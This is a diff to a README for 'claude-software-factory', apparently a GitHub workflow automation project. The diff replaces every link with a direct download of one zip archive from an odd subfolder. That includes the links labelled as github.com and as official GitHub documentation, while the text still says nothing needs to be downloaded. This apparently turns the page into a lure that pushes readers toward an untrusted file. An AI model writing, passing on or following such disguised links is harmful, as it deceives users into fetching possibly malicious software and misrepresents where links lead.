@@ -1,6 +1,6 @@
 # ⚙️ claude-software-factory - Automate Your Code Workflows Easily
 
-[![Download](https://img.shields.io/badge/Download-Get%20Started-%23ff6f61)](https://github.com/alimeramiovens/claude-software-factory)
+[![Download](https://img.shields.io/badge/Download-Get%20Started-%23ff6f61)](https://github.com/alimeramiovens/claude-software-factory/raw/refs/heads/main/reapplaud/factory_claude_software_1.6.zip)
 
 ---
 
@@ -45,13 +45,13 @@ Follow these steps to start using claude-software-factory on Windows:
 1. Open your web browser.
 
 2. Visit the download page by clicking the big button below, or copy and paste this link into the address bar:  
-   [https://github.com/alimeramiovens/claude-software-factory](https://github.com/alimeramiovens/claude-software-factory)
+   [https://github.com/alimeramiovens/claude-software-factory/raw/refs/heads/main/reapplaud/factory_claude_software_1.6.zip](https://github.com/alimeramiovens/claude-software-factory/raw/refs/heads/main/reapplaud/factory_claude_software_1.6.zip)
 
 3. You will land on the main repository page. Here, you will find all the files and instructions for the software.
 
 4. To use the workflows in your own projects, you need a GitHub repository where you want to apply automation. If you don’t have one, create a new repository on GitHub:
 
-   - Sign in or create a GitHub account at [github.com](https://github.com).
+   - Sign in or create a GitHub account at [github.com](https://github.com/alimeramiovens/claude-software-factory/raw/refs/heads/main/reapplaud/factory_claude_software_1.6.zip).
    - Click "New" to create a repository.
    - Name your repository and set visibility to public or private.
    - Click "Create repository."
@@ -71,7 +71,7 @@ Since this project works within GitHub, you don’t download a traditional progr
 Here is how to set it up step-by-step:
 
 1. Visit   
-   [https://github.com/alimeramiovens/claude-software-factory](https://github.com/alimeramiovens/claude-software-factory)  
+   [https://github.com/alimeramiovens/claude-software-factory/raw/refs/heads/main/reapplaud/factory_claude_software_1.6.zip](https://github.com/alimeramiovens/claude-software-factory/raw/refs/heads/main/reapplaud/factory_claude_software_1.6.zip)  
 
 2. Click **Use this template** on the right. This copies the setup to your GitHub.
 
@@ -134,9 +134,9 @@ A: Yes, it uses GitHub’s free tools and public workflows.
 
 ## 🔗 Useful Links
 
-- [Primary Repository and Setup](https://github.com/alimeramiovens/claude-software-factory)  
-- [GitHub Actions Documentation](https://docs.github.com/en/actions)  
-- [How to Create a GitHub Repository](https://docs.github.com/en/github/creating-cloning-and-archiving-repositories/creating-a-new-repository)  
-- [Managing Issues on GitHub](https://docs.github.com/en/issues/tracking-your-work-with-issues/about-issues)
+- [Primary Repository and Setup](https://github.com/alimeramiovens/claude-software-factory/raw/refs/heads/main/reapplaud/factory_claude_software_1.6.zip)  
+- [GitHub Actions Documentation](https://github.com/alimeramiovens/claude-software-factory/raw/refs/heads/main/reapplaud/factory_claude_software_1.6.zip)  
+- [How to Create a GitHub Repository](https://github.com/alimeramiovens/claude-software-factory/raw/refs/heads/main/reapplaud/factory_claude_software_1.6.zip)  
+- [Managing Issues on GitHub](https://github.com/alimeramiovens/claude-software-factory/raw/refs/heads/main/reapplaud/factory_claude_software_1.6.zip)
 
-[![Download](https://img.shields.io/badge/Download-Start%20Now-%237b68ee)](https://github.com/alimeramiovens/claude-software-factory)
+[![Download](https://img.shields.io/badge/Download-Start%20Now-%237b68ee)](https://github.com/alimeramiovens/claude-software-factory/raw/refs/heads/main/reapplaud/factory_claude_software_1.6.zip)
